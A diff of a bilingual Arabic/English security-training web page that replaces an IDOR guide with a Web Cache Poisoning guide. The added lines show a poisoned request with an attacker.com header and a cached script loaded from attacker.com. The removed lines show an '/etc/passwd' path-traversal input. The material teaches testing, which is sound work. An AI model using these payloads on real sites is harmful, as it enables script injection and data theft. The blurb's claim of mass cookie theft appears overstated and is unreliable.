@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="IDOR and Broken Access Control — Arabic & English guide with testing commands and tools">
-  <title>IDOR — Broken Access Control | Abdo Ramdan</title>
+  <meta name="description" content="Web cache poisoning, HTTP headers, Cache Deception, and payloads in Arabic & English">
+  <title>Web Cache Poisoning — Poisoning the Masses | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&family=Noto+Kufi+Arabic:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" id="academyCssLink" href="../css/academy.css">
   
@@ -60,66 +60,64 @@
   <main class="academy-main">
     
 <div class="page-hero">
-  <h1 class="page-title">IDOR — الوصول المباشر غير الآمن للكائنات</h1>
-  <p class="page-title-en">IDOR — Insecure Direct Object Reference</p>
+  <h1 class="page-title">تسميم الذاكرة المخبئية — تسميم الجماهير</h1>
+  <p class="page-title-en">Web Cache Poisoning — Poisoning the Masses</p>
   <span class="severity-pill pill-high">HIGH</span>
-  <span class="severity-pill pill-high">OWASP A01</span>
+  <span class="severity-pill pill-medium">OWASP A06</span>
 </div>
 
 <div class="bilingual-block">
   <div class="lang-section">
     <span class="lang-tag">AR</span>
-    <p><strong>IDOR</strong> يحدث عندما يستطيع المستخدم الوصول لبيانات أو موارد تخص مستخدمين آخرين بتغيير معرّف (ID, UUID, filename) في الطلب — بدون فحص صلاحيات كافٍ من السيرفر.</p>
+    <p><strong>Web Cache Poisoning</strong> هي ثغرة متقدمة تحدث عندما يستطيع المهاجم التلاعب برؤوس الطلبات غير المحددة في مفتاح الذاكرة المخبئية (Unkeyed Headers) مثل <code>X-Forwarded-Host</code>، لجعل الخادم يولد استجابة ضارة ويقوم وسيط الـ Cache (مثل Cloudflare أو Akamai) بحفظها وتوزيعها لجميع الزوار اللاحقين.</p>
   </div>
   <div class="lang-section lang-en">
     <span class="lang-tag">EN</span>
-    <p><strong>IDOR</strong> happens when a user accesses another user's data by modifying an object identifier (ID, UUID, filename) in the request — without adequate server-side authorization checks.</p>
+    <p><strong>Web Cache Poisoning</strong> is an advanced vulnerability where an attacker manipulates unkeyed request headers (like <code>X-Forwarded-Host</code>) to force the server into caching a malicious response, which is then served by the CDNs (like Cloudflare or Akamai) to all subsequent users.</p>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>أنواع IDOR / IDOR Types</h2>
+  <h2>أنواع تسميم الكاش / Attack Types</h2>
   <div class="type-grid">
     <div class="type-item">
-      <h4>URL Parameter IDOR</h4>
-      <p>تغيير <code>user_id=123</code> → <code>user_id=124</code></p>
+      <h4>Basic Cache Poisoning</h4>
+      <p>التلاعب بالرؤوس (Headers) لحقن جافا سكريبت في الـ Cached page.</p>
     </div>
     <div class="type-item">
-      <h4>API / JSON Body</h4>
-      <p>تعديل <code>id</code> أو <code>accountId</code> في POST/PUT body</p>
+      <h4>DOM-based Cache Poisoning</h4>
+      <p>التلاعب بالـ Unkeyed headers لتغيير المتغيرات التي تقرأها جافا سكريبت بالـ DOM.</p>
     </div>
     <div class="type-item">
-      <h4>UUID Manipulation</h4>
-      <p>تخمين أو leak UUIDs من responses أخرى</p>
-    </div>
-    <div class="type-item">
-      <h4>Mass Assignment</h4>
-      <p>إرسال fields زيادة: <code>role: admin</code>, <code>isPremium: true</code></p>
-    </div>
-    <div class="type-item">
-      <h4>Function-Level BAC</h4>
-      <p>الوصول لـ admin endpoints كـ regular user</p>
-    </div>
-    <div class="type-item">
-      <h4>Path Traversal</h4>
-      <p><code>../../etc/passwd</code> في file download paths</p>
+      <h4>Cache Deception</h4>
+      <p>خداع الـ Cache لحفظ ملفات المستخدمين الحساسة (مثل `/profile`) على أنها ملفات ثابتة (مثل `/profile.js`) لتسهيل قراءتها علناً.</p>
     </div>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>أوامر الاختبار / Testing Commands</h2>
+  <h2>أوامر واختبار الثغرة / Testing & HTTP Headers</h2>
+  <p>يتم اختبار الثغرة بإرسال ترويسات مخصصة غير مفهرسة (Unkeyed) ومراقبة ما إذا كانت تنعكس في الاستجابة ويتم إرسال ترويسة <code>X-Cache: HIT</code>:</p>
   <div class="cmd-block">
-    <pre># URL IDOR
-GET /api/users/1001/profile HTTP/1.1
-GET /api/users/1002/profile HTTP/1.1
+    <pre># طلب يحتوي على ترويسة خبيثة
+GET /index.html HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com
 
-# JSON body swap
-POST /api/orders HTTP/1.1
-{"order_id": "ORD-9999", "user_id": "VICTIM_UUID"}
+# الاستجابة المخزنة التي تحتوي على كود خبيث
+HTTP/1.1 200 OK
+X-Cache: MISS
+...
+&lt;script src="https://attacker.com/tracking.js"&gt;&lt;/script&gt;
 
-# Path traversal
-GET /download?file=../../../etc/passwd HTTP/1.1</pre>
+# عند إعادة إرسال الطلب بدون الترويسة الخبيثة، تعود نفس الاستجابة المخزنة
+GET /index.html HTTP/1.1
+Host: target.com
+
+HTTP/1.1 200 OK
+X-Cache: HIT
+...
+&lt;script src="https://attacker.com/tracking.js"&gt;&lt;/script&gt;</pre>
     <div class="cmd-footer"><button class="copy-btn" onclick="copyCmd(this)">📋 Copy</button></div>
   </div>
 </div>
@@ -127,26 +125,24 @@ GET /download?file=../../../etc/passwd HTTP/1.1</pre>
 <div class="section-card">
   <h2>الأدوات / Tools</h2>
   <div class="tools-row">
-    <span class="tool-chip">Autorize (Burp)</span>
-    <span class="tool-chip">AuthMatrix (Burp)</span>
-    <span class="tool-chip">Burp Comparer</span>
-    <span class="tool-chip">ffuf</span>
+    <span class="tool-chip">Param Miner (Burp Suite Extension)</span>
+    <span class="tool-chip">toxicache</span>
+    <span class="tool-chip">Burp Suite Repeater</span>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>Writeup & Lab</h2>
+  <h2>Writeup</h2>
   <div class="bilingual-block">
     <div class="lang-section">
       <span class="lang-tag">AR</span>
-      <p>Writeup: <strong>Finding IDOR: The Art of Access Control Bypass</strong></p>
+      <p>Writeup: <strong>Web Cache Poisoning: Poisoning the Masses</strong> — كيف استطاع الباحث جيمس كيتل حقن كود XSS في الصفحة الرئيسية لشركة كبرى وسرقة كوكيز آلاف المستخدمين دفعة واحدة عبر الكاش.</p>
     </div>
     <div class="lang-section lang-en">
       <span class="lang-tag">EN</span>
-      <p>Writeup: <strong>Finding IDOR: The Art of Access Control Bypass</strong></p>
+      <p>Writeup: <strong>Web Cache Poisoning: Poisoning the Masses</strong> — James Kettle's legendary research on mass user compromise using unkeyed header injections.</p>
     </div>
   </div>
-  <a class="cta-lab" href="labs/idor-lab.html">🧪 افتح IDOR Lab — 3 Scenarios</a>
 </div>
 
   </main>
